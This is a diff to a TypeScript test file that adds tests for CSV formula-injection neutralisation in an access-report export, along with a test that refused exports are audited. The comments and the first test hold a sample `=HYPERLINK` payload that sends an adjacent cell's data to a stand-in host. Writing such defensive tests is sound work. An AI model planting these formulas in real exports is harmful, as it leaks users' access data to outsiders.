@@ -6,6 +6,7 @@ import {
   BUNDLE_LIMITATIONS,
   bundleDigest,
   createEvidencePack,
+  csvCell,
   exportReportCsv,
   fetchEvidencePack,
   toCsv,
@@ -419,4 +420,74 @@ describe('the evidence bundle carries the campaign it names', () => {
     expect(fetched.digestMatches).toBe(true);
     expect(fetched.bundle.digest).toBe(created.digest);
   });
+});
+
+/**
+ * EVERY VALUE IN THIS EXPORT ORIGINATES IN DIRECTORY OR TARGET DATA.
+ *
+ * That is what makes this a real attack rather than a lint rule: the person who
+ * names an Active Directory group is a TARGET administrator, not a Syntra one,
+ * and Govern's entire job is to inventory systems Syntra does not control. A
+ * group named `=HYPERLINK("http://x/?"&A2,"click")` executes the moment an
+ * auditor opens the export, and the cell beside it is somebody's access.
+ *
+ * Quoting does not help: a spreadsheet strips the quotes before deciding
+ * whether the value is a formula. The value has to stop being one.
+ */
+describe('csvCell', () => {
+  it('neutralises every leading character a spreadsheet treats as a formula', () => {
+    for (const dangerous of ['=', '+', '-', '@', '\t', '\r']) {
+      const cell = csvCell(`${dangerous}HYPERLINK("http://x/?"&A2,"click")`);
+      // Prefixed, so the first character is no longer the formula introducer,
+      // and quoted so the prefix survives the parse.
+      expect(cell.startsWith(`"'${dangerous}`)).toBe(true);
+    }
+  });
+
+  it('leaves an ordinary value exactly as it was', () => {
+    // The export is read by people. Quoting or prefixing every cell would make
+    // the common case unreadable to defend against the rare one.
+    expect(csvCell('Ward Nurses')).toBe('Ward Nurses');
+    expect(csvCell('')).toBe('');
+    // A minus inside a value is not a leading minus.
+    expect(csvCell('Finance-Payments')).toBe('Finance-Payments');
+  });
+
+  it('still quotes and doubles the characters CSV itself needs escaped', () => {
+    expect(csvCell('Novak, Anna "A"')).toBe('"Novak, Anna ""A"""');
+  });
+
+  it('quotes a CARRIAGE RETURN, which used to split the row', () => {
+    // The regex tested `\n` and not `\r`, so a lone CR ended the record and
+    // every field after it landed under the wrong header -- silently, in a
+    // document whose whole purpose is that somebody can read it a year later.
+    expect(csvCell('Ward\rNurses')).toBe('"Ward\rNurses"');
+  });
+});
+
+it('audits a REFUSED export as well as a successful one', async () => {
+  // §10: "the audit log should be able to answer who took a copy of it." A
+  // refusal is part of that answer. Repeated refused attempts are what an
+  // attempt to walk out with everybody's access looks like when it does not
+  // work the first time, and they left no trace at all.
+  const live = envelope(
+    {
+      live: true as const,
+      computedAt: NOW.toISOString(),
+      exportable: false as const,
+      caveat: 'live',
+    },
+    { rows: [], holderCount: { known: true, value: 0 } },
+  );
+
+  await expect(
+    exportReportCsv(tenantId, actorUserId, live, { systemId: 'sys-1' }),
+  ).rejects.toThrow(/no as-of time/);
+
+  const event = await withTenant(tenantId, (tx) =>
+    tx.auditEvent.findFirstOrThrow({ where: { action: 'govern.report.export' } }),
+  );
+  expect(event.outcome).toBe('failure');
+  expect(event.actorUserId).toBe(actorUserId);
+  expect(event.payload).toMatchObject({ format: 'csv', scope: { systemId: 'sys-1' } });
 });
